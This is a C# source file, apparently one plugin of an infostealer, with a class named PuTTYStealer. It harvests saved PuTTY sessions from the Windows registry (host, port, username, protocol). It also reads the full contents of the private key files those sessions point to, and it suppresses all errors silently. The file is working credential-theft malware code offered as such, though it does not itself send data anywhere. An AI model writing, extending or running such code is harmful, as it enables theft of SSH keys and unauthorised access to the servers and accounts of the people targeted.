using System;
using System.Collections.Generic;
using Microsoft.Win32;

namespace Plugin.Apps
{
    public class PuTTYStealer
    {
        private const string RegistryPath = @"Software\SimonTatham\PuTTY\Sessions";
        
        public static List<PuTTYSession> ExtractSessions()
        {
            List<PuTTYSession> sessions = new List<PuTTYSession>();
            
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegistryPath))
                {
                    if (key == null)
                        return sessions;
                    
                    string[] sessionNames = key.GetSubKeyNames();
                    
                    foreach (string sessionName in sessionNames)
                    {
                        try
                        {
                            using (RegistryKey sessionKey = key.OpenSubKey(sessionName))
                            {
                                if (sessionKey == null)
                                    continue;
                                
                                PuTTYSession session = new PuTTYSession();
                                session.SessionName = sessionName;
                                
                                object hostObj = sessionKey.GetValue("HostName");
                                if (hostObj != null) session.Host = hostObj.ToString();
                                
                                object portObj = sessionKey.GetValue("PortNumber");
                                if (portObj != null) session.Port = portObj.ToString();
                                
                                object userObj = sessionKey.GetValue("UserName");
                                if (userObj != null) session.Username = userObj.ToString();
                                
                                object protoObj = sessionKey.GetValue("Protocol");
                                if (protoObj != null) session.Protocol = protoObj.ToString();
                                
                                if (!string.IsNullOrEmpty(session.Host))
                                {
                                    sessions.Add(session);
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
            
            return sessions;
        }
        
        public static Dictionary<string, string> ExtractSSHKeys()
        {
            Dictionary<string, string> keys = new Dictionary<string, string>();
            
            try
            {
                // Extract PPK (PuTTY Private Key) file paths from recent files
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\SimonTatham\PuTTY\Sessions"))
                {
                    if (key == null)
                        return keys;
                    
                    foreach (string sessionName in key.GetSubKeyNames())
                    {
                        try
                        {
                            using (RegistryKey sessionKey = key.OpenSubKey(sessionName))
                            {
                                object keyFileObj = sessionKey?.GetValue("PublicKeyFile");
                                if (keyFileObj != null)
                                {
                                    string keyFile = keyFileObj.ToString();
                                    if (!string.IsNullOrEmpty(keyFile) && System.IO.File.Exists(keyFile))
                                    {
                                        keys[$"PuTTY_{sessionName}_key"] = System.IO.File.ReadAllText(keyFile);
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
            
            return keys;
        }
    }
    
    public class PuTTYSession
    {
        public string SessionName { get; set; }
        public string Host { get; set; }
        public string Port { get; set; }
        public string Username { get; set; }
        public string Protocol { get; set; }
        
        public override string ToString()
        {
            return $"{SessionName} | {Protocol}://{Host}:{Port} | User: {Username}";
        }
    }
}
